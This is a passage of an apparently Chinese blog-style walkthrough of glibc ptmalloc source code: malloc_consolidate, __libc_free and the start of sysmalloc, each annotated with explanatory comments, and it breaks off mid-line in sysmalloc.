class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">malloc_consolidate</span><span class="hljs-params">(mstate av)</span><br>&#123;<br>  mfastbinptr*    fb;                 <span class="hljs-comment">/* current fastbin being consolidated */</span><br>  mfastbinptr*    maxfb;              <span class="hljs-comment">/* last fastbin (for loop control) */</span><br>  mchunkptr       p;                  <span class="hljs-comment">/* current chunk being consolidated */</span><br>  mchunkptr       nextp;              <span class="hljs-comment">/* next chunk to consolidate */</span><br>  mchunkptr       unsorted_bin;       <span class="hljs-comment">/* bin header */</span><br>  mchunkptr       first_unsorted;     <span class="hljs-comment">/* chunk to link to */</span><br><br>  <span class="hljs-comment">/* These have same use as in free() */</span><br>  mchunkptr       nextchunk;<br>  INTERNAL_SIZE_T size;<br>  INTERNAL_SIZE_T nextsize;<br>  INTERNAL_SIZE_T prevsize;<br>  <span class="hljs-type">int</span>             nextinuse;<br>  mchunkptr       bck;<br>  mchunkptr       fwd;<br><br>  <span class="hljs-keyword">if</span> (get_max_fast () != <span class="hljs-number">0</span>) &#123;<br><span class="hljs-comment">//global_max_fast不为0，表示ptmalloc已经初始化，清除分配区flag中fastbin的标志位</span><br><br><span class="hljs-comment">/*#define clear_fastchunks(M) \</span><br><span class="hljs-comment">  catomic_or (&amp;(M)-&gt;flags, FASTCHUNKS_BIT)*/</span><br><span class="hljs-comment">//#define FASTCHUNKS_BIT        (1U)</span><br><span class="hljs-comment">//catomic_or是一个原子操作，用于对地址上的值进行按位或运算</span><br><span class="hljs-comment">//结果flags被置为1</span><br>    clear_fastchunks(av);<br><br><span class="hljs-comment">//unsorted_chunks(M) (bin_at (M, 1))</span><br><br><span class="hljs-comment">/*#define bin_at(m, i) \  </span><br><span class="hljs-comment">  (mbinptr) (((char *) &amp;((m)-&gt;bins[((i) - 1) * 2]))         \  </span><br><span class="hljs-comment">             - offsetof (struct malloc_chunk, fd))*/</span><br><span class="hljs-comment">//每个bin占用两个指针，所以乘以2</span><br><span class="hljs-comment">//获取arena对应的unsortedbin的第一个第一个bin</span><br><br>    unsorted_bin = unsorted_chunks(av);<br><br><span class="hljs-comment">//#define fastbin(ar_ptr, idx) ((ar_ptr)-&gt;fastbinsY[idx])</span><br><br><span class="hljs-comment">//maxfb是指向fastbin中最后一个bin的指针</span><br>    maxfb = &amp;fastbin (av, NFASTBINS - <span class="hljs-number">1</span>);<br><span class="hljs-comment">//获取第一个bin的地址</span><br>    fb = &amp;fastbin (av, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">do</span> &#123;<br>    <span class="hljs-comment">//读取fb的当前值</span><br>    <span class="hljs-comment">//将fb设置为0</span><br>    <span class="hljs-comment">//返回之前的链表头地址</span><br>      p = atomic_exchange_acq (fb, <span class="hljs-number">0</span>);<br><br><br>      <span class="hljs-keyword">if</span> (p != <span class="hljs-number">0</span>) &#123;<br><span class="hljs-keyword">do</span> &#123;<br><span class="hljs-comment">//如果prev_inuse为0则报错</span><br>  check_inuse_chunk(av, p);<br>  <span class="hljs-comment">//将nextp赋值为下一个bin</span><br>  nextp = p-&gt;fd;<br>  <span class="hljs-comment">//PREV_INUSE为0x1，NON_MAIN_ARENA为0x4</span><br>  <span class="hljs-comment">//通过按位与去除PREV_INUSE位和NON_MAIN_ARENA位</span><br>  size = p-&gt;size &amp; ~(PREV_INUSE|NON_MAIN_ARENA);<br><br><span class="hljs-comment">//#define chunk_at_offset(p, s)  ((mchunkptr) (((char *) (p)) + (s)))</span><br><span class="hljs-comment">//通过当前chunk的地址和大小计算出下一个chunk的地址</span><br>  nextchunk = chunk_at_offset(p, size);<br><span class="hljs-comment">//#define chunksize(p)         ((p)-&gt;size &amp; ~(SIZE_BITS))</span><br><span class="hljs-comment">//#define SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)</span><br><span class="hljs-comment">//获取nextchunk的实际内存大小</span><br>  nextsize = chunksize(nextchunk);<br><br><span class="hljs-comment">//prev_inuse(p) ((p)-&gt;size &amp; PREV_INUSE)，确认内存块是否空闲</span><br><br><span class="hljs-comment">//如果p指向的chunk空闲，即prev_inuse为0</span><br>  <span class="hljs-keyword">if</span> (!prev_inuse(p)) &#123;<br><br>    prevsize = p-&gt;prev_size;<span class="hljs-comment">//获取前一个chunk的大小</span><br>    size += prevsize;  <span class="hljs-comment">//更新当前chunk的大小，增加前一个chunk的大小</span><br>    p = chunk_at_offset(p, -((<span class="hljs-type">long</span>) prevsize));<span class="hljs-comment">//获取上一个chunk的地址，然后赋值给p</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">#define unlink(AV, P, BK, FD) &#123;                                            \  </span><br><span class="hljs-comment">    FD = P-&gt;fd;              \  </span><br><span class="hljs-comment">    BK = P-&gt;bk;              \  </span><br><span class="hljs-comment">    //FD为要移除块的fd指针，BK为要移除块的bk指针</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">__builtin_expect是GCC提供的一个优化提示，告诉编译器在常见情况下链表是正确的，而不常见的情况下链表会损害</span><br><span class="hljs-comment">FD的bk指针如果不等于当前块或BK的fd指针不等于当前块则链表损害</span><br><span class="hljs-comment">通过malloc_printerr输出错误信息</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))        \  </span><br><span class="hljs-comment">      malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P, AV);  \  </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">如果链表没有损害，继续执行移除操作</span><br><span class="hljs-comment">    else &#123;               \  </span><br><span class="hljs-comment">    将FD的前向指针指向BK，然后将BK的后向指向指向FD</span><br><span class="hljs-comment">        FD-&gt;bk = BK;              \  </span><br><span class="hljs-comment">        BK-&gt;fd = FD;              \  </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">//判断当前块p的大小是否在小块堆的范围内。</span><br><span class="hljs-comment">        if (!in_smallbin_range (P-&gt;size)           \  </span><br><span class="hljs-comment">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) &#123;         \  </span><br><span class="hljs-comment">        //优化指令，告诉编译器这个条件很少发生</span><br><span class="hljs-comment">        //检查检查当前块在双向链表中是否完整</span><br><span class="hljs-comment">      if (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0)       \  </span><br><span class="hljs-comment">   || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0))    \  </span><br><span class="hljs-comment">        malloc_printerr (check_action,          \  </span><br><span class="hljs-comment">           &quot;corrupted double-linked list (not small)&quot;,    \  </span><br><span class="hljs-comment">           P, AV);           \ </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">判断FD的fd_nextsize是否为空，表示FD是否是当前链表的尾部</span><br><span class="hljs-comment">            if (FD-&gt;fd_nextsize == NULL) &#123;           \  </span><br><span class="hljs-comment">        如果是尾部，而且P的fd_nextsize判定为P，则将FD作为链表的唯一元素</span><br><span class="hljs-comment">                if (P-&gt;fd_nextsize == P)           \  </span><br><span class="hljs-comment">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;        \  </span><br><span class="hljs-comment">                else &#123;              \  </span><br><span class="hljs-comment">                确保双向链接的完整性</span><br><span class="hljs-comment">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;         \  </span><br><span class="hljs-comment">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;         \  </span><br><span class="hljs-comment">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;         \  </span><br><span class="hljs-comment">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;         \  </span><br><span class="hljs-comment">                  &#125;             \  </span><br><span class="hljs-comment">                  如果FD-&gt;nextsize不为空，意味着FD已经位于链表中。</span><br><span class="hljs-comment">              在这种情况下，需要更新P的前后链接</span><br><span class="hljs-comment">              &#125; else &#123;              \  </span><br><span class="hljs-comment">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;        \  </span><br><span class="hljs-comment">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;        \  </span><br><span class="hljs-comment">              &#125;              \  </span><br><span class="hljs-comment">          &#125;              \  </span><br><span class="hljs-comment">      &#125;               \  </span><br><span class="hljs-comment">&#125;</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-comment">//av即当前的arena</span><br><span class="hljs-comment">//p为要移除的块</span><br>    unlink(av, p, bck, fwd);<span class="hljs-comment">//将前一个chunk从链表中移除</span><br>  &#125;<br><br><span class="hljs-comment">//如果nextchunk和top chunk不相同，则说明当前的内存块不是堆中的顶端块</span><br>  <span class="hljs-keyword">if</span> (nextchunk != av-&gt;top) &#123;<br><span class="hljs-comment">/*#define inuse_bit_at_offset(p, s)           \  </span><br><span class="hljs-comment">  (((mchunkptr) (((char *) (p)) + (s)))-&gt;size &amp; PREV_INUSE)*/</span><br><span class="hljs-comment">//检查nextchunk是否为已分配，如果已分配则nextinuse为1</span><br>    nextinuse = inuse_bit_at_offset(nextchunk, nextsize);<br><br><span class="hljs-comment">//如果nextinuse为未分配则执行</span><br>    <span class="hljs-keyword">if</span> (!nextinuse) &#123;<br><span class="hljs-comment">//将nextchunk的nextsize追加到当前块p的大小size上，更新合并后块的大小</span><br>      size += nextsize;<br>      <span class="hljs-comment">//将nextchunk移除</span><br>      unlink(av, nextchunk, bck, fwd);<br>    &#125; <span class="hljs-keyword">else</span><br>    <span class="hljs-comment">//如果nextchunk已分配，则清除nextchunk的prev_inuse位</span><br>      clear_inuse_bit_at_offset(nextchunk, <span class="hljs-number">0</span>);<br><br><span class="hljs-comment">//将unsortedbin的第一个指针存入first_unsorted中</span><br>    first_unsorted = unsorted_bin-&gt;fd;<br>    <span class="hljs-comment">//将当前块p插入到unsortedbin的开头</span><br>    unsorted_bin-&gt;fd = p;<br>    <span class="hljs-comment">//将原先的第一个未排序块的后向指针指向当前块p，完成双向链表的更新</span><br>    first_unsorted-&gt;bk = p;<br><br>    <span class="hljs-keyword">if</span> (!in_smallbin_range (size)) &#123;<br>      p-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>      p-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>    &#125;<br><br>    set_head(p, size | PREV_INUSE);<br>    p-&gt;bk = unsorted_bin;<br>    p-&gt;fd = first_unsorted;<br>    set_foot(p, size);<br>  &#125;<br>  <span class="hljs-keyword">else</span> &#123;<br>    size += nextsize;<br>    set_head(p, size | PREV_INUSE);<br>    av-&gt;top = p;<br>  &#125;<br>&#125; <span class="hljs-keyword">while</span> ( (p = nextp) != <span class="hljs-number">0</span>);<br><span class="hljs-comment">//直到遍历完当前fastbin中的所有空闲chunk</span><br>      &#125;<br>    &#125; <span class="hljs-keyword">while</span> (fb++ != maxfb);<br>    <span class="hljs-comment">//直到遍历完所有的fastbin</span><br>  &#125;<br>  <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-comment">//如果ptmalloc没有初始化，初始化ptmalloc</span><br>    malloc_init_state(av);<br>    check_malloc_state(av);<br>  &#125;<br>&#125;<br><br>__libc_free (<span class="hljs-type">void</span> *mem)<br>&#123;<br>  mstate ar_ptr;<br>  mchunkptr p;                          <span class="hljs-comment">/* chunk corresponding to mem */</span><br><br>  <span class="hljs-type">void</span> (*hook) (<span class="hljs-type">void</span> *, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *)<br>    = atomic_forced_read (__free_hook);<br>  <span class="hljs-keyword">if</span> (__builtin_expect (hook != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>))<br>    &#123;<br>      (*hook)(mem, RETURN_ADDRESS (<span class="hljs-number">0</span>));<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>  <span class="hljs-keyword">if</span> (mem == <span class="hljs-number">0</span>)                              <span class="hljs-comment">/* free(0) has no effect */</span><br>    <span class="hljs-keyword">return</span>;<br><br>  p = mem2chunk (mem);<br><br>  <span class="hljs-keyword">if</span> (chunk_is_mmapped (p))                       <span class="hljs-comment">/* release mmapped memory. */</span><br>    &#123;<br>      <span class="hljs-comment">//如果当前的free是chunk通过mmap分配的，调用munmap_chunk函数</span><br>      <span class="hljs-keyword">if</span> (!mp_.no_dyn_threshold<br>          &amp;&amp; p-&gt;size &gt; mp_.mmap_threshold<br>          &amp;&amp; p-&gt;size &lt;= DEFAULT_MMAP_THRESHOLD_MAX)<br>        &#123;<br>          mp_.mmap_threshold = chunksize (p);<br>          mp_.trim_threshold = <span class="hljs-number">2</span> * mp_.mmap_threshold;<br>          LIBC_PROBE (memory_mallopt_free_dyn_thresholds, <span class="hljs-number">2</span>,<br>                      mp_.mmap_threshold, mp_.trim_threshold);<br>        &#125;<br>      munmap_chunk (p);<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>  ar_ptr = arena_for_chunk (p);<br>  _int_free (ar_ptr, p, <span class="hljs-number">0</span>);<br>  <span class="hljs-comment">//不需要对分配区加锁，调用_int_free函数执行实际的释放工作</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="sysmalloc-源码分析"><a href="#sysmalloc-源码分析" class="headerlink" title="sysmalloc 源码分析"></a>sysmalloc 源码分析</h2><p><code>sysmalloc</code>负责向操作系统申请内存</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> *  <br><span class="hljs-title function_">sysmalloc</span> <span class="hljs-params">(INTERNAL_SIZE_T nb, mstate av)</span>  <br>&#123;  <br>  mchunkptr old_top;              <span class="hljs-comment">//av-&gt;top的原始值</span><br>  INTERNAL_SIZE_T old_size;       <span class="hljs-comment">//它的大小  </span><br>  <span class="hljs-type">char</span> *old_end;                  <span class="hljs-comment">//它的结束地址 </span><br>  <br>  <span class="hljs-type">long</span> size;                      <span class="hljs-comment">//参数给MORECORE或mmap调用  </span><br>  <span class="hljs-type">char</span> *brk;                      <span class="hljs-comment">//MORECORE的返回值  </span><br>  <br>  <span class="hljs-type">long</span> correction;                <span class="hljs-comment">//参数给第二个MORECORE调用  </span><br>  <span class="hljs-type">char</span> *snd_brk;                  <span class="hljs-comment">//第二个返回值 </span><br>  <br>  INTERNAL_SIZE_T front_misalign; <span class="hljs-comment">/* 表示分配内存时，在起始地址与对齐要求之间多出的不可用字节 */</span>  <br>  INTERNAL_SIZE_T end_misalign;   <span class="hljs-comment">/* 表示分配后，在页面结尾部分由于对齐问题而留下的不可用字节 */</span>  <br>  <span class="hljs-type">char</span> *aligned_brk;              <span class="hljs-comment">/* 执行brk内经过对齐调整后的地址 */</span>  <br>  <br>  mchunkptr p;                    <span class="hljs-comment">/* 用于指向分配器内部的内存块结构 */</span>  <br>  mchunkptr remainder;            <span class="hljs-comment">/* 分配内存后剩余的内存块 */</span>  <br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> remainder_size;   <span class="hljs-comment">/* 表示remainder块的大小 */</span>  <br>  <br>  <span class="hljs-comment">//GLRO是一个宏，用于读取全局只读变量。</span><br>  <span class="hljs-comment">//dl_pagesize是一个变量，表示系统页面的大小。</span><br>  <span class="hljs-type">size_t</span> pagesize = GLRO (dl_pagesize);  <br>  <span class="hljs-comment">//tried_mmap 表示程序是否使用 mmap 系统调用分配内存</span><br>  <span class="hljs-type">bool</span> tried_mmap = <span class="hljs-literal">false</span>;  <br>    <br>  <span class="hljs-comment">/*  </span><br><span class="hljs-comment">     如果使用mmap，并且请求的大小达到mmap阈值，并且系统支持mmap，</span><br><span class="hljs-comment">     并且当前分配的mmap区域数量较少，尝试直接映射这个请求，</span><br><span class="hljs-comment">     而不是扩展top</span><br><span class="hljs-comment">  */</span>  <br>  <span class="hljs-comment">//当arena为空，或请求内存nb超过阈值（mmap_threshold）且mmap次数未达到限制时，则进入mmap分配</span><br>  <span class="hljs-keyword">if</span> (av == <span class="hljs-literal">NULL</span>  <br>      || ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb) &gt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (mp_.mmap_threshold)  <br>    &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max)))  <br>    &#123;  <br>      <span class="hljs-type">char</span> *mm;           <span class="hljs-comment">//mmap调用的返回值</span><br>  <br>    try_mmap:  <span class="hljs-comment">//定义一个标签，提供一个跳转位置</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">将大小上调到最近的页大小。对于mmapped区块，开销比普通区块多一个SIZE_SZ单位，</span><br><span class="hljs-comment">因为没有后续区块的prev_size字段可用。</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-comment">//MALLOC_ALIGNMENT是内存分配的对齐单位，通常为16字节</span><br>      <span class="hljs-keyword">if</span> (MALLOC_ALIGNMENT == <span class="hljs-number">2</span> * SIZE_SZ)  <br><span class="hljs-comment">//对齐到页大小时，只需将用户请求大小nb加上元数据开销SIZE_SZ，并调整为页大小的整数倍</span><br><span class="hljs-comment">//ALIGN_UP是对齐函数，确保(nb+SIZE_SZ)的大小是pagesize的整数倍</span><br>        size = ALIGN_UP (nb + SIZE_SZ, pagesize);  <br>      <span class="hljs-keyword">else</span>  <br>    <span class="hljs-comment">//如果对齐规则更复杂，需要考虑额外的对齐掩码，MALLOC_ALIGN_MASK</span><br>    <span class="hljs-comment">//MALLOC_ALIGN_MASK 的作用是用于处理非双字对齐的需求</span><br>        size = ALIGN_UP (nb 